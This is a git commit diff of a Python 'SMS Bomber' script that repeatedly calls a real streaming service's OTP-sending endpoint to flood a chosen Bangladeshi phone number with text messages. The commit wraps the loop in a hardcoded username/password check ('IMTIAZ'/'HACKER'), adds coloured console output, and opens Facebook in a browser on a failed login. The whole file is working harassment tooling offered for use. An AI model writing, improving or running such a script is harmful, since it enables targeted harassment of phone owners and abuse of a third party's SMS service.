e51f5df1c8b515cd1a918391ab01ce182001f9c1
IMTIAZ <126008482+IMTIAZ-X@users.noreply.github.com>
2023-03-02 19:01:01 +0600

    Update SMS Bomber.py

--- SMS Bomber.py
+++ SMS Bomber.py
@@ -1,14 +1,41 @@
+import os
 import requests
 
-#GET
-number=str(input(" Enter The Number : +88"))
+upurple = '\033[95m'
+byellow = '\033[93m'
+igreen = '\033[92m'
+bred = '\033[1;31m'
+color_off = '\033[0m'
 
-amount=int(input(" Enter The Amount : "))
+print(upurple+'''\n================================================================'''+color_off)
 
-api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+usern='''IMTIAZ'''
+passwd='''HACKER'''
 
-for i in range(amount):
-    resp = requests.get(api)
-    print(str(i+1)+" SMS Sent")
-    print(resp.text)
-    
+inpuser=str(input(byellow+'''\nEnter The Username: '''+color_off))
+inppass=str(input(byellow+'''Enter The Password: '''+color_off))
+
+if usern==inpuser and passwd==inppass:
+	print(igreen+'''[✓] Username & Password Correct! '''+color_off)
+	
+	os.system("clear")
+	
+	#GET
+	number=str(input(" Enter The Number : +88"))
+
+	amount=int(input(" Enter The Amount : "))
+
+	api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+	for i in range(amount):
+	    resp = requests.get(api)
+	    print(str(i+1)+" SMS Sent")
+	    print(resp.text)
+
+else:
+	print(bred+'''[ × ] Incorrect Username! /Password!
+                Please Try Again
+
+                    [Contact Admin]  '''+color_off) 
+
+	os.system("xdg-open \'https://www.facebook.com\'")
